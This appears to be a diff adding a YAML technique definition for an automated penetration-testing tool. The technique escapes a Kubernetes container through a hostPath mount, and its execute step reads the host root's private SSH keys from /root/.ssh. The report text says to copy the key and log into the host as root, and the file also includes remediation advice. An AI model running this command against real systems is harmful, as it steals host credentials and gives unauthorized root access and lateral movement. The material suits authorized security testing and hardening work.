@@ -1,0 +1,46 @@
+# Container escape → hostPath /root/.ssh leaked → host SSH as root
+#
+# Companion to the hostpath_shadow TTP. When a Kubernetes hostPath mount
+# exposes /root (or /home) into a container, the operator reads the host's
+# root SSH keys directly — no cracking needed, just ssh into the host with
+# the leaked private key. Even more immediate than the shadow-leak path,
+# and usually a bigger config oversight (mounting /root is a stronger tell
+# of "this pod shouldn't exist").
+technique: T1611
+name: Container escape → /root/.ssh leaked via hostPath → host SSH
+tactic: [credential-access, lateral-movement]
+platform: [linux]
+key: container_escape:hostpath_root_ssh
+ranking:
+  exploitability: high         # SSH keys are one-shot access, not a crack effort
+  safety: read-only            # just reads /root/.ssh
+  detection: quiet
+detect:
+  facts_match:
+    in_container: true
+    uid: 0
+execute:
+  # Try both id_rsa and id_ed25519 — modern hosts use ed25519, older
+  # ones still ship RSA. If either read succeeds, we have the private key.
+  command: |-
+    (cat /root/.ssh/id_rsa 2>/dev/null || cat /root/.ssh/id_ed25519 2>/dev/null) \
+      | head -c 200 && echo && ls -la /root/.ssh 2>/dev/null
+verify:
+  # Both key formats begin with a recognizable header.
+  success: "PRIVATE KEY"
+cleanup:
+  command: ""
+report:
+  vector_type: container_escape_hostpath_root_ssh
+  description: >
+    A hostPath volume that includes /root (or /home) exposes host-user
+    SSH private keys to the container. Copy the key back, log into the
+    host, and you ARE the host user. This is the most immediate
+    hostPath escape — no cracking, no exec. Root's key ends any question
+    of blast radius; a regular user's key is still lateral to the node.
+  remediation: >
+    Same rule as hostpath_shadow: restrict hostPath via Pod Security
+    Standards (baseline profile disallows most hostPath). Never mount
+    /root, /home, /etc, /var/lib, or /proc into a pod without a written
+    tier-0 exception.
+  refs: [T1611, T1552.004, T1078.003, CIS-K8s-5.1.2]
